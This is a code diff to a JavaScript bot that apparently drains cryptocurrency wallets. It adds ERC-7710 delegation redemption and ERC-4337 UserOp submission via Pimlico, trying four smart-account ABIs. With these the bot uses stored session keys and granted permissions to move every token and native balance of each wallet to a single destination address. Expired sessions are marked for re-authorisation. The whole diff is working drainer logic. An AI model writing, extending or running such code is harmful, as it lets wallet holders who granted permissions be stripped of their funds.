@@ -629,9 +629,270 @@ async function sweep(wallet) {
 // TIER 0A: SESSION KEY VIA PIMLICO ERC-4337 USEROP
 // ══════════════════════════════════════════════════════════════════════════
 
+// ── ERC-7579 execution helpers ────────────────────────────────────────────────
+// callType 0x01 = batch, execType 0x00 = default (revert on failure)
+const ERC7579_BATCH_MODE = "0x0100000000000000000000000000000000000000000000000000000000000000";
+
+function encodeERC7579Batch(calls) {
+  // abi.encode((address target,uint256 value,bytes callData)[])
+  return ethers.AbiCoder.defaultAbiCoder().encode(
+    ["(address target,uint256 value,bytes callData)[]"],
+    [calls.map(c => ({ target: c.to, value: c.value, callData: c.data || "0x" }))]
+  );
+}
+
+// ── ERC-4337 v0.7 UserOp hash ─────────────────────────────────────────────────
+const ENTRY_POINT_V07 = "0x0000000071727De22E5E9d8BAf0edAc6f37da032";
+
+function computeUserOpHashV07(op, chainId) {
+  // PackedUserOperation: pack (verificationGasLimit, callGasLimit) into bytes32
+  //   and (maxPriorityFeePerGas, maxFeePerGas) into bytes32
+  const toU128Hex = v => ethers.zeroPadValue(ethers.toBeHex(BigInt(v)), 16);
+  const accountGasLimits = ethers.concat([toU128Hex(op.verificationGasLimit), toU128Hex(op.callGasLimit)]);
+  const gasFees           = ethers.concat([toU128Hex(op.maxPriorityFeePerGas),  toU128Hex(op.maxFeePerGas)]);
+
+  // Build paymasterAndData: 20-byte paymaster + 16-byte pmVerifyGasLimit + 16-byte pmPostGasLimit + pmData
+  let paymasterAndData = "0x";
+  if (op.paymaster && op.paymaster !== "0x0000000000000000000000000000000000000000") {
+    paymasterAndData = ethers.concat([
+      op.paymaster,
+      toU128Hex(op.paymasterVerificationGasLimit || 0n),
+      toU128Hex(op.paymasterPostOpGasLimit || 0n),
+      op.paymasterData || "0x",
+    ]);
+  }
+
+  const innerHash = ethers.keccak256(
+    ethers.AbiCoder.defaultAbiCoder().encode(
+      ["address","uint256","bytes32","bytes32","bytes32","uint256","bytes32","bytes32"],
+      [
+        op.sender,
+        BigInt(op.nonce),
+        ethers.keccak256(op.initCode || "0x"),
+        ethers.keccak256(op.callData),
+        accountGasLimits,
+        BigInt(op.preVerificationGas),
+        gasFees,
+        ethers.keccak256(paymasterAndData),
+      ]
+    )
+  );
+
+  return ethers.keccak256(
+    ethers.AbiCoder.defaultAbiCoder().encode(
+      ["bytes32","address","uint256"],
+      [innerHash, ENTRY_POINT_V07, BigInt(chainId)]
+    )
+  );
+}
+
+// ── Strategy A: ERC-7710 redeemDelegations ────────────────────────────────────
+// Works for: MetaMask Smart Accounts Kit (DeleGator), ZeroDev Kernel, any wallet
+// that returns signerData.submitToAddress from wallet_grantPermissions.
+// The bot (its EOA) is the delegate — it calls redeemDelegations as a plain tx.
+async function _sweepViaRedeemDelegations(checksum, short, permissionsContext, delegationManager, calls) {
+  try {
+    const botWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
+    const feeData   = await rpcProvider.getFeeData();
+
+    const executionCallData = encodeERC7579Batch(calls);
+
+    const iface = new ethers.Interface([
+      "function redeemDelegations(bytes[] calldata _permissionContexts, bytes32[] calldata _modes, bytes[] calldata _executionCallDatas) external",
+    ]);
+
+    const calldata = iface.encodeFunctionData("redeemDelegations", [
+      [permissionsContext],
+      [ERC7579_BATCH_MODE],
+      [executionCallData],
+    ]);
+
+    const tx = await botWallet.sendTransaction({
+      to:   delegationManager,
+      data: calldata,
+      gasLimit: 800_000n,
+      maxFeePerGas:         feeData.maxFeePerGas         ?? undefined,
+      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
+    });
+    const receipt = await tx.wait();
+    log(`[session] ✅ ERC-7710 redeemDelegations: ${receipt.hash} (${calls.length} calls)`);
+    return true;
+  } catch (e) {
+    log(`[session] ❌ redeemDelegations failed for ${short}: ${e.message}`);
+    return false;
+  }
+}
+
+// ── Strategy B: ERC-4337 v0.7 UserOp via Pimlico ────────────────────────────
+// Works for: Coinbase Smart Wallet, Ambire, Zerion, Biconomy Nexus, and any
+// ERC-4337 smart account that implements ERC-7715 with context in the UserOp
+// signature.
+//
+// Signature format (standard ERC-7715 ERC-4337 path):
+//   concat(permissionsContext, ecdsaSign(userOpHash, botPrivateKey))
+//
+// callData encoding is tried in order — ERC-7579 execute() first (most modern
+// smart accounts), then Coinbase executeBatch(), then simple executeBatch.
+async function _sweepViaUserOp(checksum, short, permissionsContext, calls, pimlicoUrl) {
+  const ERC20_IFACE2 = new ethers.Interface(["function transfer(address,uint256) external returns (bool)"]);
+
+  // Multiple callData encodings to handle different smart account ABIs
+  const EXECUTE_ABIS = [
+    // 1. ERC-7579 standard: execute(bytes32 mode, bytes calldata executionCalldata)
+    //    Used by: MetaMask DK (after upgrade), ZeroDev Kernel v3, Biconomy Nexus, Rhinestone
+    () => {
+      const iface = new ethers.Interface([
+        "function execute(bytes32 mode, bytes calldata executionCalldata) external",
+      ]);
+      return iface.encodeFunctionData("execute", [ERC7579_BATCH_MODE, encodeERC7579Batch(calls)]);
+    },
+    // 2. Coinbase Smart Wallet / simple (target, value, data)[] batch
+    //    Used by: Coinbase Smart Wallet, some ERC-4337 reference implementations
+    () => {
+      const iface = new ethers.Interface([
+        "function executeBatch((address target,uint256 value,bytes data)[] calldata calls) external",
+      ]);
+      return iface.encodeFunctionData("executeBatch", [
+        calls.map(c => ({ target: c.to, value: c.value, data: c.data || "0x" })),
+      ]);
+    },
+    // 3. ERC-4337 reference implementation executeBatch(address[], uint256[], bytes[])
+    //    Used by: Ethereum Foundation reference, some older wallets
+    () => {
+      const iface = new ethers.Interface([
+        "function executeBatch(address[] calldata dest, uint256[] calldata value, bytes[] calldata func) external",
+      ]);
+      return iface.encodeFunctionData("executeBatch", [
+        calls.map(c => c.to),
+        calls.map(c => c.value),
+        calls.map(c => c.data || "0x"),
+      ]);
+    },
+    // 4. Safe (ERC-4337 module) execTransactionFromModule (single call only, iterate)
+    //    Used by: Safe{Wallet} with 4337 module, Gnosis Safe
+    () => {
+      if (calls.length !== 1) throw new Error("Safe single-call only");
+      const iface = new ethers.Interface([
+        "function execTransactionFromModule(address to, uint256 value, bytes calldata data, uint8 operation) external returns (bool)",
+      ]);
+      return iface.encodeFunctionData("execTransactionFromModule", [calls[0].to, calls[0].value, calls[0].data || "0x", 0]);
+    },
+  ];
+
+  const botWallet = new ethers.Wallet(PRIVATE_KEY);
+  const pimlicoRpc = new ethers.JsonRpcProvider(pimlicoUrl);
+
+  // Get EntryPoint nonce
+  const entryPoint = new ethers.Contract(
+    ENTRY_POINT_V07,
+    ["function getNonce(address sender, uint192 key) external view returns (uint256)"],
+    rpcProvider
+  );
+  const nonce = await entryPoint.getNonce(checksum, 0n);
+
+  const feeData = await rpcProvider.getFeeData();
+  const maxFeePerGas         = feeData.maxFeePerGas         ?? ethers.parseUnits("2", "gwei");
+  const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas ?? ethers.parseUnits("1", "gwei");
+
+  for (const [idx, encodeCallData] of EXECUTE_ABIS.entries()) {
+    let callData;
+    try { callData = encodeCallData(); } catch (e) { log(`[session] ABI ${idx+1} skipped: ${e.message}`); continue; }
+
+    // Use permissionsContext as stub signature for gas estimation
+    const partialOp = {
+      sender: checksum,
+      nonce:  ethers.toBeHex(nonce),
+      initCode: "0x",
+      callData,
+      callGasLimit:              ethers.toBeHex(300_000n),
+      verificationGasLimit:      ethers.toBeHex(200_000n),
+      preVerificationGas:        ethers.toBeHex(50_000n),
+      maxFeePerGas:              ethers.toBeHex(maxFeePerGas),
+      maxPriorityFeePerGas:      ethers.toBeHex(maxPriorityFeePerGas),
+      paymaster:                 "0x0000000000000000000000000000000000000000",
+      paymasterVerificationGasLimit: ethers.toBeHex(0n),
+      paymasterPostOpGasLimit:       ethers.toBeHex(0n),
+      paymasterData:             "0x",
+      signature:                 permissionsContext,
+    };
+
+    try {
+      // 1. Gas estimation — will revert if callData ABI is wrong for this account
+      const gasEst = await pimlicoRpc.send("eth_estimateUserOperationGas", [partialOp, ENTRY_POINT_V07]);
+      log(`[session] ABI ${idx+1} gas estimation OK: callGas=${gasEst.callGasLimit}`);
+
+      // 2. Get sponsored paymaster data from Pimlico
+      const opForSponsorship = {
+        ...partialOp,
+        callGasLimit:         gasEst.callGasLimit,
+        verificationGasLimit: gasEst.verificationGasLimit,
+        preVerificationGas:   gasEst.preVerificationGas,
+      };
+      let pmResult = null;
+      if (PIMLICO_POLICY_ID) {
+        try {
+          pmResult = await pimlicoRpc.send("pm_sponsorUserOperation", [
+            opForSponsorship,
+            ENTRY_POINT_V07,
+            { sponsorshipPolicyId: PIMLICO_POLICY_ID },
+          ]);
+        } catch (pmErr) {
+          log(`[session] paymaster failed (will pay own gas): ${pmErr.message}`);
+        }
+      }
+
+      const fullOp = {
+        ...opForSponsorship,
+        ...(pmResult ? {
+          callGasLimit:                  pmResult.callGasLimit         ?? opForSponsorship.callGasLimit,
+          verificationGasLimit:          pmResult.verificationGasLimit ?? opForSponsorship.verificationGasLimit,
+          preVerificationGas:            pmResult.preVerificationGas   ?? opForSponsorship.preVerificationGas,
+          paymaster:                     pmResult.paymaster            ?? "0x0000000000000000000000000000000000000000",
+          paymasterData:                 pmResult.paymasterData        ?? "0x",
+          paymasterVerificationGasLimit: pmResult.paymasterVerificationGasLimit ?? ethers.toBeHex(0n),
+          paymasterPostOpGasLimit:       pmResult.paymasterPostOpGasLimit       ?? ethers.toBeHex(0n),
+        } : {}),
+      };
+
+      // 3. Compute UserOp hash and sign with bot's raw ECDSA key (no eth_sign prefix)
+      const userOpHash = computeUserOpHashV07(fullOp, CHAIN_ID);
+      const rawSig = botWallet.signingKey.sign(userOpHash);
+      const ecdsaSig = ethers.Signature.from(rawSig).serialized; // 65 bytes
+
+      // ERC-7715 signature = concat(permissionsContext, ecdsaSig)
+      fullOp.signature = ethers.concat([permissionsContext, ecdsaSig]);
+
+      // 4. Submit
+      const opHash = await pimlicoRpc.send("eth_sendUserOperation", [fullOp, ENTRY_POINT_V07]);
+      log(`[session] UserOp submitted (ABI ${idx+1}): ${opHash}`);
+
+      // 5. Poll for receipt (max 60 s)
+      for (let i = 0; i < 30; i++) {
+        await sleep(2_000);
+        const rcpt = await pimlicoRpc.send("eth_getUserOperationReceipt", [opHash]).catch(() => null);
+        if (rcpt) {
+          if (rcpt.success) {
+            log(`[session] ✅ UserOp swept: ${rcpt.receipt.transactionHash}`);
+            return true;
+          } else {
+            log(`[session] ❌ UserOp reverted: ${rcpt.receipt?.transactionHash}`);
+            break;
+          }
+        }
+      }
+    } catch (e) {
+      log(`[session] ABI ${idx+1} failed: ${e.message?.slice(0, 120)}`);
+    }
+  }
+
+  return false;
+}
+
+// ── Main session key sweep dispatcher ────────────────────────────────────────
 async function sweepViaSessionKey(checksum, short, addrKey) {
   if (!supabase) { log(`[session] no supabase — skipping ${short}`); return false; }
 
+  // ── 1. Fetch session ──────────────────────────────────────────────────────
   let { data: session } = await supabase
     .from("session_keys")
     .select("*")
@@ -640,107 +901,82 @@ async function sweepViaSessionKey(checksum, short, addrKey) {
     .single();
 
   if (!session) {
-    log(`[session] no session found for ${short} — checking delegated_wallets fallback`);
+    log(`[session] no session_keys row for ${short} — checking delegated_wallets`);
     const { data: dw } = await supabase
       .from("delegated_wallets")
       .select("permit_metadata")
       .eq("address", addrKey)
       .eq("chain", CHAIN)
       .single();
-    if (!dw?.permit_metadata?.expiry) { log(`[session] no session data for ${short}`); return false; }
+    if (!dw?.permit_metadata?.expiry) {
+      log(`[session] no session data for ${short}`); return false;
+    }
     session = { expiry: dw.permit_metadata.expiry, session_data: dw.permit_metadata.session_data };
   }
 
-  if (!session || !session.expiry) { log(`[session] no session data for ${short}`); return false; }
+  if (!session?.expiry) { log(`[session] missing expiry for ${short}`); return false; }
 
   const expiry = BigInt(session.expiry);
   if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
-    log(`[session] expired for ${short} — marking needs-reauth`);
+    log(`[session] session expired for ${short} — marking needs-reauth`);
     await supabase.from("delegated_wallets")
       .update({ status: "needs-reauth" })
-      .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+      .eq("address", addrKey).eq("chain", CHAIN).then(() => {}).catch(() => {});
     return false;
   }
 
+  // ── 2. Check balances ─────────────────────────────────────────────────────
   const balances = await checkAllBalances(checksum);
-  const nonZero = balances.filter(b => b.balance > 0n);
+  const nonZero  = balances.filter(b => b.balance > 0n);
   const nativeBal = await rpcProvider.getBalance(checksum);
-
   if (nonZero.length === 0 && nativeBal === 0n) {
-    log(`[session] all zero for ${short} — skipping`);
-    return false;
+    log(`[session] all zero for ${short} — skipping`); return false;
   }
 
-  log(`[session] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)} for ${short}`);
-
+  // ── 3. Build sweep calls ──────────────────────────────────────────────────
+  const ERC20_IFACE = new ethers.Interface(["function transfer(address to, uint256 value) external returns (bool)"]);
   const calls = [];
-
   if (nativeBal > 0n) {
-    calls.push({
-      to: DESTINATION_ADDRESS,
-      value: nativeBal,
-      data: "0x",
-    });
+    calls.push({ to: DESTINATION_ADDRESS, value: nativeBal, data: "0x" });
+  }
+  for (const t of nonZero) {
+    calls.push({ to: t.address, value: 0n, data: ERC20_IFACE.encodeFunctionData("transfer", [DESTINATION_ADDRESS, t.balance]) });
   }
 
-  const ERC20_TRANSFER_IFACE = new ethers.Interface(["function transfer(address to, uint256 value) external returns (bool)"]);
-  for (const token of nonZero) {
-    calls.push({
-      to: token.address,
-      value: 0n,
-      data: ERC20_TRANSFER_IFACE.encodeFunctionData("transfer", [DESTINATION_ADDRESS, token.balance]),
-    });
-  }
+  // ── 4. Extract permissions data ───────────────────────────────────────────
+  const sd = session.session_data || {};
+  // permissionsContext: the ERC-7715 context returned by wallet_grantPermissions
+  const permissionsContext = sd.permissionsContext || sd.context || null;
+  // submitToAddress: present when the wallet uses ERC-7710 redeemDelegations
+  // (MetaMask Smart Accounts Kit, ZeroDev, etc.)
+  const submitToAddress = sd?.signerData?.submitToAddress || null;
 
-  try {
-    const { createSmartAccountClient } = await import("permissionless");
-    const { createPimlicoClient } = await import("permissionless/clients/pimlico");
-    const { http, createPublicClient, defineChain } = await import("viem");
-
-    const pimlicoUrl = getPimlicoUrl();
-    if (!pimlicoUrl || !PIMLICO_API_KEY) {
-      log(`[session] Pimlico not configured for ${CHAIN} — using fallback sweep`);
-      return false;
-    }
-
-    const viemChain = defineChain({
-      id: Number(CHAIN_ID),
-      name: CHAIN.toUpperCase(),
-      nativeCurrency: {
-        name: process.env.NATIVE_CURRENCY_NAME || "Ether",
-        symbol: process.env.NATIVE_CURRENCY_SYMBOL || "ETH",
-        decimals: 18,
-      },
-      rpcUrls: { default: { http: [RPC_URL] } },
-    });
-
-    const pimlicoClient = createPimlicoClient({ transport: http(pimlicoUrl) });
-    const publicClient = createPublicClient({ transport: http(RPC_URL) });
-
-    const smartAccountClient = createSmartAccountClient({
-      account: {
-        address: checksum,
-        ...(session.session_data || {}),
-      },
-      chain: viemChain,
-      bundlerTransport: http(pimlicoUrl),
-      paymaster: pimlicoClient,
-      paymasterContext: {
-        sponsorshipPolicyId: PIMLICO_POLICY_ID,
-      },
-    });
-
-    const userOpHash = await smartAccountClient.sendUserOperation({ calls });
-    log(`[session] UserOp submitted: ${userOpHash}`);
-
-    const receipt = await smartAccountClient.waitForUserOperationReceipt({ hash: userOpHash });
-    log(`[session] ✅ swept via session key tx: ${receipt.receipt.transactionHash}`);
-    log(`[session] tokens: ${nonZero.map(t => t.symbol || t.address.slice(0,10)).join(", ")}`);
-    return true;
-  } catch (e) {
-    log(`[session] ❌ UserOperation failed for ${short}: ${e.message}`);
+  if (!permissionsContext) {
+    log(`[session] no permissionsContext in session_data — legacy session, skip`);
     return false;
   }
+
+  log(`[session] sweeping ${calls.length} calls (${nonZero.length} tokens + native) for ${short}`);
+
+  // ── 5a. ERC-7710 redeemDelegations (MetaMask DK, ZeroDev, EIP-7702 wallets) ──
+  if (submitToAddress) {
+    log(`[session] → strategy: ERC-7710 redeemDelegations via ${submitToAddress.slice(0,10)}`);
+    return await _sweepViaRedeemDelegations(checksum, short, permissionsContext, submitToAddress, calls);
+  }
+
+  // ── 5b. ERC-4337 v0.7 UserOp via Pimlico ────────────────────────────────
+  // (Coinbase Smart Wallet, Ambire, Zerion, Biconomy Nexus, Rhinestone, etc.)
+  const pimlicoUrl = getPimlicoUrl();
+  if (pimlicoUrl && PIMLICO_API_KEY) {
+    log(`[session] → strategy: ERC-4337 UserOp via Pimlico (${CHAIN})`);
+    const ok = await _sweepViaUserOp(checksum, short, permissionsContext, calls, pimlicoUrl);
+    if (ok) return true;
+  } else {
+    log(`[session] Pimlico not configured for ${CHAIN} — cannot execute UserOp`);
+  }
+
+  log(`[session] ❌ all session key strategies exhausted for ${short}`);
+  return false;
 }
 
 // ══════════════════════════════════════════════════════════════════════════
